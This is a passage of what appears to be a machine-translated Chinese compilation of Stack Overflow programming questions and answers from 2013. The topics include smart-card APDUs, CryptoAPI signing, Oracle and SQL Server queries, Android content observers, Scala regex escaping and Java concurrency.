或者也许唯一的方法是从 APDU 向我的设备发送字节？如果是这样，如何构造正确的 APDU 并找出字段值（CLA、INS 等）？

我的意图是进入卡上的目录并从卡中读取文件。

感谢您提前分享您的知识：）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-10T06:59:25.650

我不知道标准库（既不用于 android 也不用于任何其他平台）并且找到一个的可能性很低，因为卡具有如此不同的命令子集和实现的功能。如果不确定生成的 APDU 是否可以工作，统一库有什么好处？因此，大多数解决方案都使用中间件，该中间件使用显示支持功能的描述文件，有时结合一些活动代码来重新格式化命令或通过一系列 APDU 组成所需的功能。由于为此类解决方案付出了巨大努力，其中大多数都是严格以目的为导向的，例如 PKCS#11。因此，您的解决方案要么解决存在此类框架的小扇区，要么您必须自己组合这些字节。看看[这个答案](https://stackoverflow.com/questions/513292/pc-sc-functions-for-digital-signature/612786#612786)对于 7816 指针，其中第 4 部分、第 8 部分和第 9 部分是最重要的，或者搜索 ISO 24727（也是一个多部分标准），它也尝试在来自不同制造商的卡上统一前端。

您的具体问题的一个问题是，没有标准化的“目录”命令（通常存在专有命令）。虽然有一个 EF.DIR，但它只是卡上的应用程序列表（由它们的 AID 表示），它比文件高一级，因此您还需要应用程序规范。阅读也可能需要访问权限，因此之前需要某种身份验证（PIN 或质询-响应测试）。

# javascript - 以编程方式将 CheckColumn 设置为选中

> ID：15899076
> 
> 赞同：3
> 
> 时间：2013-04-09T10:06:19.113
> 
> 标签：javascript, extjs4

我在“gridpanel”中使用“CheckColumn”，并且我正在使用一个包含图表的窗口。在窗口中，当我单击图表中的某些值时，我必须将相应的复选框设置为在网格中选中。我的问题是如何将复选框设置为以编程方式选中？我得到了我需要的相应值的行 ID，但我不知道如何使用它来检查它。

非常感谢！

```
 // in the code below, i am searching for the specific row how contain my value 
grids.getStore().each(function(rec){  
                    var rowData = rec.data; 
                    if (rowData['value']==value)
                   {  
                   var record = grids.getStore().getAt(rec.index);

                   // what i can do now? // thanks  

                   }
                }); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-07-21T16:08:48.370

我找到了我需要的，只是：添加

```
rec.set('myfield', true); 
```

谢谢

# wpf - 在 Wpf 应用程序中，xaml 修改不会在运行时反映

> ID：15899093
> 
> 赞同：0
> 
> 时间：2013-04-09T10:07:13.720
> 
> 标签：wpf, xaml

在 Wpf 应用程序中，xaml 修改不会在运行时反映。我们在 GAC 中有一些 dll。可能的原因是什么。我正在保存并重新构建应用程序

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-09T10:10:26.703

执行以下步骤：

**1.清理应用程序（WPF）**

**2\. 重建应用程序 - 不构建。**

**3\. 按 WindowsKey+R 并在运行窗口中键入 %temp% 并删除那里的所有数据**

**4\. 清除缓存/cookie（Alt + Shift + del）**

运行应用程序。这将起作用。我有同样的问题。以上步骤解决。

# openssl - 使用 CryptoAPI 的 MD5-SHA1 哈希

> ID：15899094
> 
> 赞同：0
> 
> 时间：2013-04-09T10:07:18.437
> 
> 标签：openssl, cryptoapi

我需要使用 MD5-SHA1 哈希对数据进行签名（数据的 MD5 哈希和 SHA1 哈希组合然后签名）。

主要要求：

MD5-SHA1 哈希是由 OpenSSL 以某种未公开的方式提供的。这个哈希是完整的。

现在我的要求是使用 Crypto API 签署这个散列而不进行散列（只需要签名，不需要再次散列）。为什么选择 CryptoAPI，而不是 OpenSSL？因为，我正在处理带有不可导出私钥的证书。它的私钥只能被 CryptoAPI 使用，不能被 OpenSSL 使用。

这种情况来自 SSL 握手，其中将客户端验证部分（在不可导出的私钥的情况下）发送到我的层，并尝试使用 CryptoAPI 对数据进行签名。

另外，我想了解使用 OpenSSL 使用不可导出私钥证书的其他方法。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-13T16:27:39.050

通过在 CryptCreateHash 中使用 CALG_SSL3_SHAMD5 ，然后调用 CryptSetHashParam 然后调用 CryptSignHash 为我完成了这项工作。

让我详细说明一下要求： 1\. 通常，我将使用 EVP_PKEY 的私钥提供给 OpenSSL 函数，以便它可以执行签名部分。我曾经从 Windows 证书存储中提取私钥（当密钥被标记为可导出时）。但在一种情况下，私钥未标记为可导出，我无法获得 EVP_PKEY 的私钥。因此，我在私钥不可用的情况下对 OpenSSL 代码进行了修改，然后使用 CryptoAPI 实现签名部分（因为 CryptoAPI 允许使用这种不可导出的密钥进行签名）。

因此，就我而言，数据完全由 OpenSSL 散列（使用 md5-sha1 散列）。留给我的唯一一件事就是签名。

因此，以下步骤（在签名部分下）完成了这项工作：

```
1\. Created hash using Certificate key handle provider and use CALG_SSL3_SHAMD5 algorithm.
2\. Using CryptSetHashParam, I set the initial hash value
3\. Signed the hash using CryptSignHash.
4\. After that, reverse the bytes order (as OpenSSL signature is Big endian mentioned [here][1] which I found after lots of experimenting). 
```

OpenSSL 的其余代码似乎对这个签名很满意。

# oracle - 如何在oracle中将当前日期与上一年的值相加

> ID：15899100
> 
> 赞同：1
> 
> 时间：2013-04-09T10:07:41.893
> 
> 标签：oracle, oracle9i

任何机构都可以帮我解决这个问题：

```
 Value  Date

 1000   01-jan-12
 ............
 1000   01-apr-13 
```

我的目标是从当前月份和年份计算从当前月份和年份 APRIL-13 到前一年获得的分数总和。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-09T10:22:52.347

您的示例数据显示自 2013 年 4 月起超过一年。

假设你想回到 2012 年 4 月

```
select sum(value)
  from your_tab
 where date >= add_months(trunc(sysdate, 'mm', -12) -- from 1st apr 2012
   and date < trunc(sydate, 'mm');-- anytime up to the end of mar 2013 
```

如果你想回到前一年的一月，那么

```
select sum(value)
  from your_tab
 where date >= trunc(add_months(trunc(sysdate, 'mm', -12), 'yy') -- from 1st jan 2012
   and date < add_months(trunc(sydate, 'mm'), 1); -- anytime up to the end of apr 2013 
```

# java - 无法再从 Eclipse 创建 Web 服务 - 获取 NullPointerException - useJava6Compiler

> ID：15899103
> 
> 赞同：0
> 
> 时间：2013-04-09T10:07:53.300
> 
> 标签：java, web-services, cxf

我使用 Eclipse 中的 Webservice Wizard 使用 APACHE CXF 创建了几个 Web 服务。但是，当这次尝试再次创建一个非常简单的 web 服务时，我收到了错误：

```
java2ws - Apache CXF 2.7.3

Apr 9, 2013 3:40:04 AM org.apache.cxf.service.factory.ReflectionServiceFactoryBean buildServiceFromClass
INFO: Creating Service {http://reg.com/}MistySTestService from class com.reg.EchoStringSEI
java.lang.NullPointerException
    at org.apache.cxf.common.util.Compiler.useJava6Compiler(Compiler.java:190)
    at org.apache.cxf.common.util.Compiler.compileFiles(Compiler.java:144)
    at org.apache.cxf.tools.java2wsdl.generator.wsdl11.BeanGenerator.generateAndCompile(BeanGenerator.java:91)
    at org.apache.cxf.tools.java2wsdl.generator.wsdl11.BeanGenerator.generate(BeanGenerator.java:58)
    at org.apache.cxf.tools.java2wsdl.generator.wsdl11.BeanGenerator.generate(BeanGenerator.java:35)
    at org.apache.cxf.tools.java2wsdl.processor.JavaToWSDLProcessor.generate(JavaToWSDLProcessor.java:156)
    at org.apache.cxf.tools.java2wsdl.processor.JavaToWSDLProcessor.process(JavaToWSDLProcessor.java:118)
    at org.apache.cxf.tools.java2ws.JavaToWSContainer.processWSDL(JavaToWSContainer.java:110)
    at org.apache.cxf.tools.java2ws.JavaToWSContainer.execute(JavaToWSContainer.java:75)
    at org.apache.cxf.tools.common.toolspec.ToolRunner.runTool(ToolRunner.java:103)
    at org.apache.cxf.tools.common.toolspec.ToolRunner.runTool(ToolRunner.java:58)
    at org.apache.cxf.tools.common.toolspec.ToolRunner.runTool(ToolRunner.java:40)
    at org.apache.cxf.tools.java2ws.JavaToWS.run(JavaToWS.java:77)
    at org.apache.cxf.tools.java2ws.JavaToWS.main(JavaToWS.java:45) 
```

我可能已经将一些代码从标准 JAVA 项目复制到了这个 Dynamic WebProject。关于可能导致此问题的任何建议？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-09T11:23:52.630

在 cxf 版本 2.7.3 的那一行，useJava6Compiler 类试图使用它刚刚获得的编译器的实例。我建议它找不到要使用的 Java 编译器。

获取编译器的 ToolProvider 类是 javax.tools.ToolProvider；您还可以编写一个小程序，获取系统上的编译器引用并查看它返回的内容，并找出它找不到的原因。

# hadoop - 缺电脑的工厂如何利用hbase+hadoop

> ID：15899104
> 
> 赞同：0
> 
> 时间：2013-04-09T10:07:53.853
> 
> 标签：hadoop, hbase

我是 hbase&hdaoop 的新手，最近我们想为工厂构建实时数据显示应用程序。元数据是从其他已在使用的应用程序中收集的。我们应该分析数据做一些计数，为客户制作一些图表视图。但是，如果工厂没有足够的电脑搭建hbase+hadoop集群，我的团队想通过这个案例开始学习和使用hbase+hadoop为以后的应用做准备。感谢您的任何建议。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-09T14:11:18.347

学习使用单节点虚拟机（[1、2、3](https://ccp.cloudera.com/display/SUPPORT/Demo+VMs) [）](http://hortonworks.com/products/hortonworks-sandbox/)，[生产](http://www.mapr.com/products/download)使用[云](http://aws.amazon.com/about-aws/whats-new/2012/06/12/amazon-elastic-mapreduce-hbase-mapr/)。

# android - 在 Android 内容观察器中观察 Audio.Media.EXTERNAL_CONTENT_URI 的变化

> ID：15899110
> 
> 赞同：13
> 
> 时间：2013-04-09T10:08:06.717
> 
> 标签：android, android-sdcard, contentobserver, android-mediascanner, fileobserver

我正在开发一个 Android 应用程序，我必须在其中检测 Android SD 卡中音频文件的更改，其中包含文件名、文件路径和对其执行的操作。例如，如果我在我的 SD 卡中添加一个文件，那么我想知道

1.  添加的文件名
2.  文件路径
3.  操作——添加

以前我尝试过文件观察器但为此我必须将它应用于每个目录。所以我搜索了一些其他解决方案并获得了有关**Audio.Media.EXTERNAL_CONTENT_URI**的信息。然后我创建了一个像这样的内容观察者

UriObserver.java -- 内容观察者

```
class UriObserver extends ContentObserver {

    public UriObserver(Handler handler) {
        super(handler);
        // TODO Auto-generated constructor stub
    }

    @Override
    public void onChange(boolean selfChange) {
        // TODO Auto-generated method stub
        super.onChange(selfChange);

        Log.d("INSTANT", "GETTING CHANGES");
    }

} 
```

这是它的注册代码

```
UriObserver observer = new UriObserver(new Handler());

Log.d("INSTANT", "registered content observer");

this.getApplicationContext()
    .getContentResolver()
    .registerContentObserver(
    MediaStore.Images.Media.EXTERNAL_CONTENT_URI, false,
    observer);

Log.d("INSTANT", "registered content observer"); 
```

它让我知道与音频文件相关的 sdcard 发生了一些变化。但它没有提供有关添加、编辑或删除哪个文件的任何信息。

然后我搜索了解决方案并得到了这篇文章

[Android：通过 MTP 连接时如何检测 MediaStore 的变化](https://stackoverflow.com/questions/12546967/android-how-to-detect-a-change-in-mediastore-when-connected-over-mtp?answertab=active#tab-top)

**在这篇文章中， Bhiefer**给出了一些代码作为答案，我认为它可以工作，所以我试图实现它，但我无法做到。

我能为此做些什么？

## 更新

我可以查询 Audio.Media.EXTERNAL_CONTENT_URI 的最新更改吗？这段代码：

```
mCursor = context.getContentResolver().query(
                    Audio.Media.EXTERNAL_CONTENT_URI, null, null, null, "_id");

mCursor.moveToLast(); 
```

没有给出最新的变化。还有其他方法可以获取最新更改吗？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-04-12T16:48:18.977

让我试着放松一下

**内容观察者**

它不会为您提供有关已更改内容的信息

这是每个设计。[文档](http://developer.android.com/reference/android/database/ContentObserver.html)中没有任何内容表明它将为您提供此信息。

**文件观察者**

它不是递归的

是的。这是知道的[问题](https://code.google.com/p/android/issues/detail?id=33659)。遍历所有目录并设置观察者有什么问题？根据我的理解，默认情况下不应该有很多（比如说十几个）。

**Android：通过 MTP 连接时如何检测 MediaStore 的变化**

您找到的代码只是包裹在 UriObserver 中的 ContentObserver。

它做了几件事

*   他获得了一个内容提供的光标（在他的情况下，我相信它是来自 MediaStore 的图像）

*   他为此注册了一名观察员

*   一旦发生一些变化，它会将这些变化转发给外部监听器

但是，此解决方案有两个限制：

*   它继承了 ContentObserver 的问题，即它不报告数据发生了什么。

*   我相信它只会报告在此 MediaStore 内容提供程序中注册的文件的更改。我相信系统只会扫描 SD 卡上的特殊目录以检查图像等。因此，如果文件将被放置在另一个目录中，则此解决方案将看不到它。

那么，您对他的代码有什么疑问？

**概括**

在这种情况下，如果您想知道 scdard 上所有文件的确切更改类型，我认为您找不到比 FileObserver 更好的东西

**更新 1**

结合更多的想法，这可能不适合你。如果您可以根设备，那么您可以选择为文件系统编写过滤器驱动程序，因此每次发生更改时都会调用您的驱动程序。

你可以看看这个链接： [http ://www.gossamer-threads.com/lists/linux/kernel/355190](http://www.gossamer-threads.com/lists/linux/kernel/355190)

或者您可以重用一些现有的 linux 更改通知系统。例如，看看这个： [http](http://stefan.buettcher.org/cs/fschange/) ://stefan.buettcher.org/cs/fschange/ 。但是，可能 FileObserver 正是基于它。

无论如何，这两种方法都是低级的，需要更多的时间来弄清楚。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2015-10-13T20:33:49.927

您可以通过查询 DATE_ADDED 和 DATE_MODIFIED 列来获取最新的添加/修改，**但您不会得到 DELETIONS**。

这是我的做法：

```
SharedPreferences preferences = PreferenceManager.getDefaultSharedPreferences(context);
long lastDatabaseUpdateTime = preferences.getLong("lastDatabaseUpdateTime", 0);
long newDatabaseUpdateTime = (new Date()).getTime();

String[] cols = new String[] {MediaStore.Audio.Media._ID /* and other columns */};

String where = "("+MediaStore.MediaColumns.DATE_ADDED + ">" + (lastDatabaseUpdateTime/1000);
where += " or " + MediaStore.MediaColumns.DATE_MODIFIED + ">" + (lastDatabaseUpdateTime/1000);
where += ") and "+MediaStore.Audio.AudioColumns.IS_MUSIC+"==1 ";

Cursor cursor = MusicUtils.query(context, MediaStore.Audio.Media.EXTERNAL_CONTENT_URI, cols, where, null, null);

/* Do my work on the cursor and close the cursor */

//If no exceptions, then save the new timestamp
SharedPreferences.Editor editor = preferences.edit();
editor.putLong("lastDatabaseUpdateTime", newDatabaseUpdateTime);
editor.commit(); 
```

# php - 按键集对动态 3D 数组进行 aplhabetically 排序

> ID：15899115
> 
> 赞同：0
> 
> 时间：2013-04-09T10:08:14.987
> 
> 标签：php, arrays, multidimensional-array, sorting

虽然这个帖子有很多类似的话题，但在这个论坛和网络上都没有重复，或者也许有但我找不到。

我需要按 KEY 的字母顺序对这个数组进行排序。问题是，所有的 KEY 都是动态的，所以有 STATIC 可以依赖。

除了其他帖子，我还查看了 PHP 的排序函数，如 multisort、ksor 等。

错误列出：在 ACADEMIC 下，[Students] 和 [Staff] 在 MARKETING [Applications] 和 [Activity] 下

提前致谢

**大批**

```
Array
(
    [ACADEMIC] => Array
        (
            [Communications] => Array
                (
                    [Email] => academic/email
                    [Sms] => academic/sms
                )

            [Exams] => Array
                (
                    [Assessments] => academic/assessments
                )

            [Students] => Array
                (
                    [Progress] => academic/progress
                )

            [Staff] => academic/staff
        )

    [ACCOUNTS] => Array
        (
            [Order] => accounts/order
        )

    [ADMIN] => Array
        (
            [Menus] => admin/menus
            [Permissions] => admin/permissions
            [Roles] => admin/roles
            [Users] => admin/users
        )

    [AGENTS] => Array
        (
            [New] => agents/new
        )

    [MARKETING] => Array
        (
            [Applications] => Array
                (
                    [Edit] => marketing/edit
                    [New] => marketing/new
                )

            [Activity] => marketing/activity
        )

) 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-09T12:43:14.990

找到了方法：

```
foreach ($array as $key => $inner)
{
   ksort($array[$key]);
} 
```

# javascript - MVC 4 - 带有 ActionResult 的 Bootstrap Typeahead 源

> ID：15899116
> 
> 赞同：0
> 
> 时间：2013-04-09T10:08:20.647
> 
> 标签：javascript, jquery, asp.net-mvc, twitter-bootstrap, typeahead.js

我正在使用 MVC 4 和 Entity Framework 来开发 Intranet Web 应用程序。根据我的观点，我必须实现自动完成功能。为此，我正在使用 Bootstrap Typeahead。我试图通过我的动作（所以我的函数）来提供输入元素，但它似乎不起作用。

这是我的操作结果，它返回一个 Json ：

```
public ActionResult AutoComplete(string term)
{
    var result = db.Persons.Where(p => p.FirstName.ToLower().Contains(term.ToLower()) || p.LastName.ToLower().Contains(term.ToLower())).ToList().Select(p => p.FullName).ToList();

    return Json(result, JsonRequestBehavior.AllowGet);

} 
```

我的观点和我的脚本：

```
@model IEnumerable<BuSIMaterial.Models.Person>

@{
    ViewBag.Title = "Index";

}

<link href="/Content/PagedList.css" rel="stylesheet" type="text/css" />

<h2>Index</h2>

<input type="text" class="typeahead" data-provide="typeahead">

@section Scripts
{
    @Scripts.Render("~/bundles/jqueryval")
    @Scripts.Render("~/bundles/jqueryui")
    @Styles.Render("~/Content/themes/base/css")

        $(".typeahead").typeahead({
            source: function (query, process) {
                var persons = [];
                map = {};

                // This is going to make an HTTP post request to the controller
                return $.post('/Person/AutoComplete', { query: query }, function (data) {

                    // Loop through and push to the array
                    $.each(data, function (i, person) {
                        map[person.Name] = person;
                        map[person.F]
                        persons.push(country.Name);
                    });

                    // Process the details
                    process(countries);
                });
            },
            updater: function (item) {
                var selectedShortCode = map[item].ShortCode;

                // Set the text to our selected id
                $("#details").text("Selected : " + selectedShortCode);
                return item;
            }
        });

    </script>
} 
```

在我的母版页中，我调用了 Bootstrap jquery 文件。知道发生了什么吗？

# string - scala，字符串变量处理为字符串而不是正则表达式

> ID：15899122
> 
> 赞同：3
> 
> 时间：2013-04-09T10:08:30.903
> 
> 标签：string, scala, replace

可以无缝吗？

```
 scala> val p = "$"
 scala> "hello, I have 65 dollars".replaceFirst("dollars", p) 
```

目前的结果是

```
 java.lang.StringIndexOutOfBoundsException: String index out of range: 1
 .... 
```

scala 2.10 中的预期结果：

```
 hello, I have 65 $ 
```

问题在于`p`存储符号的变量`$`，我需要将其作为字符串处理而不是正则表达式。

**注意：** *我不能修改（例如替换所有非字母符号）p 变量（仅限标准函数，例如 .toString）*

**注意2：**给定的示例是玩具示例。我会很感激一个更通用的解决方案。即变量`p`可以包含任何类型的内容（符号、数字、文本……），因此将“$”替换为“\\$”没有多大意义

（这是类似问题的改进版本：[scala string, raw string](https://stackoverflow.com/q/15898667/1408096)）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-09T10:15:10.640

您需要转义美元符号文字，因为[Java 在其正则表达式的实现中使用它作为组引用](http://www.bennadel.com/blog/255-Issues-with-Dollar-Signs-And-Java-s-Matcher-AppendReplacement-Method.htm)。

您注意到您无法修改 p 变量中的字符串文字，因此您需要求助于替换美元符号和其他特殊字符，如下[所示](http://download.oracle.com/javase/7/docs/api/java/util/regex/Pattern.html#quote%28java.lang.String%29)：

```
Pattern.quote(p); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2014-04-25T12:11:46.737

用于`Regex.quote`模式和`quoteReplacement`替换字符串。（这些只是调用`Pattern`。）

```
scala> import util.matching._
import util.matching._

scala> "hello, I have 65 dollars".replaceFirst("dollars", Regex quoteReplacement p)
res7: String = hello, I have 65 $

scala> "dollars".r replaceFirstIn ("hello, I have 65 dollars", Regex quoteReplacement p)
res8: String = hello, I have 65 $

scala> "hello, I have 65 dollars".replaceAllLiterally("dollars", p) // quotes both
res9: String = hello, I have 65 $ 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-09T12:59:39.000

问题是 replaceFirst() 使用正则表达式，所以：

```
"65 dollars".replaceFirst("dollars","$0") // compiles
"65 dollars".replaceFirst("dollars","$")  // throws "StringIndexOutOfBoundsException" 
```

如果，

```
val dollars = "$" 
```

您可以转义 $ 符号，

```
"65 dollars".replaceFirst( "dollars", if(dollars == "$") "\\$" else dollars ) 
```

或使用字符串插值，

```
s"65 $dollars" 
```

或者去老式的字符串操作，

```
val t = "65 dollars".split("dollars"); if(t.size>1) t.mkString(dollars) else t(0) + dollars 
```

或者用地图，

```
val ff = "dollars"
val r1 = "$"
"65 dollars, 3 dollars, 50 dollars".split(ff).zipWithIndex.map{case (t,0) => t+r1; case (t,_) => t+ff}.mkString 
```

# sql - 返回 SQL Server 2008 中的唯一行

> ID：15899128
> 
> 赞同：0
> 
> 时间：2013-04-09T10:08:50.963
> 
> 标签：sql, sql-server-2008, count, group-by

我有一个带有 2 个 ID 列的 SQL Server 表：`Employee_ID & Type_ID`

我的表包含 4 行：

```
Row 1 (Employee ID: 904, Type_ID: 3)
Row 2 (Employee ID: 904, Type_ID: 7)
Row 3 (Employee ID: 905, Type_ID: 7)
Row 4 (Employee ID: 905, Type_ID: 7) 
```

我想返回所有员工可用的所有类型 ID。所以只是`ID 7`。

所以我想要 ID 为 7 的 1 行返回，因为它适用于两个员工（904 和 905）

如果我运行以下 SQL：

```
SELECT 
    Type_ID, Count(Type_ID) as MyCount 
FROM 
    EmployeeType
WHERE 
    Employee_ID  IN (904, 905)  
GROUP BY 
    Type_ID 
```

这让我返回 2 行

```
Row 1 (Type_ID: 3, MyCount: 1)
Row 2 (Type_ID: 7, MyCount: 3) 
```

但我只有最高计数的记录（Type_ID 7）。我尝试添加：

```
HAVING MAX(Count(CostCentre_ID)) 
```

但这显然是非法代码。

如何在我的 SQL 中执行此操作？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-09T10:26:38.870

我假设您想找到`TypeId`分配给 all的`EmployeeId`。

```
Declare @t table
(
EmployeeId int,
TypeId int
)
Insert Into @t
Select 904, 3
Union 
Select 904, 5
Union 
Select 904, 7
Union 
Select 905, 5
Union 
Select 905, 7
Union 
Select 908, 3
Union 
Select 908, 7

Select Distinct a.TypeId
From @t a
Join 
(
    Select TypeId,
            COUNT(*) Over(Partition by TypeId)as [Occurs]
    From @t
)b on a.TypeId = b.TypeId

Where b.Occurs = (Select COUNT(Distinct(EmployeeId))
                From @t
                ) 
```

这将返回`7`，因为它是唯一`TypeId`分配给所有员工的。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-09T12:05:15.917

受到 Barry 的回答的启发，即使有这样的“重复”行，也能得到正确的结果：

```
declare @t table (
  employeeid int, typeid int, notes int
)
insert into @t
  select 904, 3, 0 union
  select 904, 5, 0 union
  select 904, 5, 1 union
  select 904, 7, 0 union
  select 905, 7, 0 union
  select 905, 7, 1 union
  select 908, 3, 0 union
  select 908, 5, 0 union
  select 908, 7, 0 union
  select 908, 9, 0 union
  select 908, 3, 0 
```

获取所有`typeid`s 存在的所有`employeeid`s：

```
select typeid
from @t
group by typeid
having count(distinct employeeid) = (
  select count(distinct employeeid)
  from @t) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-09T10:28:34.827

你能试试这个：

```
SELECT Type_ID, Occurance FROM 
(
SELECT Type_ID, Count(Employee_ID) OVER (PARTITION BY Employee_ID) AS Occurance
FROM EmployeeType
) T
WHERE T.Occurance > 2 
```

# jquery-ui - 如何在 Jeasy-ui 中获取选项卡标题和索引

> ID：15899134
> 
> 赞同：1
> 
> 时间：2013-04-09T10:09:22.027
> 
> 标签：jquery-ui, jquery-easyui

我们必须有 4 个选项卡，我们必须从中找到每个选项卡的标题，并根据其标题为每个选项卡设置一些属性。

我怎样才能在迭代选项卡集上获得这样的标题。我已经到达迭代选项卡？接下来做什么？

提前致谢。

```
var tabs = $('#tt').tabs('tabs');
for(i=0; i<tabs.length; i++)
{
 /*
 How can i code here to get the each tab title. if tab title is "First Tab" i have to set some to that tab.
 */
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-09T10:37:51.673

尝试

```
$('#tt ul.tabs li').each(function(i, v) {
    var elTitle = $('.tabs-title', v);
    var title = elTitle.html();
    alert('found titile ' + title + ' at ' + i);
}); 
```

演示：[小提琴](http://jsfiddle.net/arunpjohny/kVS7S/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-05-16T18:54:44.263

尝试这个：

```
var tabs = $('#tt ul.tabs li').size();
for (var i = 0; i < tabs; i++) { 
   var title = $('#tt .tabs-title')[i].innerHTML;
   alert('Found titile ' + title + ' at ' + i);
} 
```

演示：http: [//jsfiddle.net/D5Gm8/](http://jsfiddle.net/D5Gm8/)

# java - Java中的并行任务

> ID：15899135
> 
> 赞同：0
> 
> 时间：2013-04-09T10:09:27.910
> 
> 标签：java, multithreading, concurrency, java.util.concurrent

假设我有几个任务要在 Java 中并行运行。每个任务都返回成功或失败。每个任务都有一个相关的截止日期。如果一个任务在截止日期前没有完成，它会被中断（所有任务都是可*中断*的）并返回失败。

如果其中一项任务失败（即返回失败），我们会中断所有其他仍在运行的任务。

我们应该等到*所有*任务完成，最后如果所有任务都返回成功则返回成功，或者如果至少一个任务返回失败则返回失败。

你将如何实施它？我将使用*util.concurrent*。您会建议哪些库原语？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-09T10:17:59.070

我会使用`ExecutorService`with`CountDownLatch`和一个接口数组列表`Future`来保存任务：

```
List<List<String>> elements = MyPartition.partition(bigObjectList, size); 
List<Future<?>> tasks = new ArrayList<Future<?>>();
ExecutorService executor = Executors.newFixedThreadPool(4);
CountDownLatch doneSignal =  new CountDownLatch(10);
for(List<String> l: elements) {         
   ReadTask worker = new ReadTask(doneSignal, l);
   tasks.add(executor.submit(worker));
}   

long timeout = 10000;
doneSignal.await(timeout, TimeUnit.MINUTES);
boolean notFinished = false;
if(doneSignal.getCount() > 0) {
  for(Future<?> fut : tasks) {
    if(!fut.isDone()) {
      System.out.println("Sub Thread " + fut + " has not finshed!");
      fut.cancel(true);             
      notFinished = true;
    }
  }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-09T10:42:36.600

ExecutorCompletionService 似乎最接近

```
 ExecutorService ex = Executors.newCachedThreadPool();
    ExecutorCompletionService<Boolean> cs = new ExecutorCompletionService<Boolean>(
            ex);
    List<Callable<Boolean>> tasks = new ArrayList<Callable<Boolean>>();
       ... add tasks
    List<Future<Boolean>> futures = new ArrayList<Future<Boolean>>();
    for (Callable<Boolean> t : tasks) {
        futures.add(cs.submit(t));
    }
    for (!futures.isEmpty()) {
        try {
            Future<Boolean> f = cs.poll(1, TimeUnit.SECONDS);
            futures.remove(f);  // poll returns the same instance of Future as in the futures list
            if (f == null || !f.get()) {  // poll returns null on timeout
                break;
            }
        } catch (Exception e) {
            break;
        }
    }
    // cancel remaining tasks, if all finished OK the list will be empty
    for (Future<Boolean> future : futures) {
        future.cancel(true);
    } 
```

# ssh - 通过 SSH 创建一个新的屏幕窗口？

> ID：15899137
> 
> 赞同：0
> 
> 时间：2013-04-09T10:09:37.617
> 
> 标签：ssh, gnu, gnu-screen

我有一个我在网上找到的函数可以添加到我的 .bashrc 中，它会使用主机名生成一个新的 SSH 会话：

```
# Opens SSH on a new screen window with the appropriate name.
screen_ssh() {
    numargs=$#
    screen -t ${!numargs} ssh $@
if [ $TERM == "screen" -o $TERM == "screen.linux" ] && [ ! -z "$PS1" ];  then
    alias ssh=screen_ssh
fi

if [[ $- == *i* ]]
then
  [ "$STY" ] && ssh() { screen -t "${1##*@}" ssh "$@"; } # Spawn new window in Screen  for SSH
fi 
```

但它也会对别名执行此操作，如下所示：

```
lsrem(){ ssh $1 "ls -l" ; } 
```

所以我的问题是如何阻止它使用别名/函数，并且只能以交互方式工作：

```
ssh somehost 
```

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-11T10:10:15.337

我找到了一种（hacky）方式：

```
# Opens SSH on a new screen window with the appropriate name.
screen_ssh() {
    numargs=$#
        if [ "$numargs" -eq "1" ];
        then   
                screen -t ${!numargs} ssh $@
        else   
                ssh $@
        fi
}
if [ $TERM == "screen" -o $TERM == "screen.linux" ]; then
    alias ssh=screen_ssh
fi 
```

这会检查 SSH 的 args 数量是否大于 1，因此当我这样做时不会产生新的屏幕会话：

```
ssh hostname 
```

我绝对愿意接受更好的方法来做到这一点！

# java - 安装在设备上的应用程序未显示在应用程序菜单中

> ID：15899140
> 
> 赞同：2
> 
> 时间：2013-04-09T10:09:49.497
> 
> 标签：java, android

我正在尝试在三星 Galaxy Tab 2 上运行眼睛检测应用程序。当我运行该应用程序时，它会在控制台窗口中显示以下内容：

```
[2013-04-08 14:24:16 - EyeDetect] Performing sync
[2013-04-08 14:24:20 - EyeDetect] Uploading EyeDetect.apk onto device 'c16070a0ffe3c9f'
[2013-04-08 14:24:20 - EyeDetect] Installing EyeDetect.apk...
[2013-04-08 14:24:23 - EyeDetect] Success!
[2013-04-08 14:24:23 - EyeDetect] \EyeDetect\bin\EyeDetect.apk installed on device
[2013-04-08 14:24:23 - EyeDetect] Done! 
```

但是，该应用程序不会显示在 Android 设备上的应用程序菜单中。但是，它确实出现在 下的应用程序列表中`settings>application>manage applications`。

所以它似乎是设备上安装的应用程序之一，但我不知道如何运行该应用程序。我真的需要你的帮助。

此外，我无法调试应用程序，因为调试透视图没有出现。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2019-06-13T12:40:10.610

1.检查意图过滤器的位置！

2.检查是否存在重复的</intent filter>，如果存在则删除一个。

3.Intent-filter 内部属性如 <data android:mimeType="image/*/>

```
 <category android:name="android.intent.category.LAUNCHER" />

    //Remove        <!--<data android:mimeType="image/*" />--> 
```

4.  Foreach 内部意图过滤器属性，您可以确定您知道它们为何存在。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-13T22:43:32.760

眼睛检测应用程序可能是一项新功能，它会出现在设置下。例如。当您安装壁纸和键盘时，它们位于设置>应用程序>管理应用程序中，但它们不会在屏幕上显示为应用程序，因为它们没有意图过滤器，如前所述。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-09T10:15:18.033

尝试以下操作：

如果该应用程序之前已安装并且未再次安装，则从命令提示符运行“adb uninstall”包名称

在手机设置 -> 应用程序 -> 开发 -> 可调试为 true

尝试从命令提示符 adb install apk.file 安装应用程序

重启设备：重启手机&eclipse

